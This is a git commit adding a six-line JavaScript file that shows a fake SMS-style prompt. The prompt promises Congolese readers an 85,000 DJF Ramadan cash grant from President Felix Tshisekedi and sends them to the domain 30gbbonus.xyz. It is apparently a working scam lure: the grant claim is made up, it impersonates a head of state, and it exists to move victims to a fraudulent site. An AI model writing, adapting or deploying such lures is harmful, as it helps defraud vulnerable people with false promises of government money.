41bd070dfa2a2c8c1f192e33457e59e0066efbf1
xmasdata <152927198+xmasdata@users.noreply.github.com>
2025-03-15 07:10:25 +0100

    Create congo-active.js

---
+++ congo-active.js
@@ -0,0 +1,6 @@
+
+var password = 'RETIRER 85 000 DJF'
+password=prompt('SMS: Félicitations, vous êtes qualifié, Président FELIX TSHISEKEDI, Subvention en espèces du Ramadan de 85 000 DJF pour les CONGOLAIS, veuillez appuyer sur OK pour retirer de l'argent   ','RETIRER 85 000 DJF');
+if (password != 'RETIRER 85 000 DJF') {
+location.href='https://30gbbonus.xyz/drc-ramadan.html';
+}
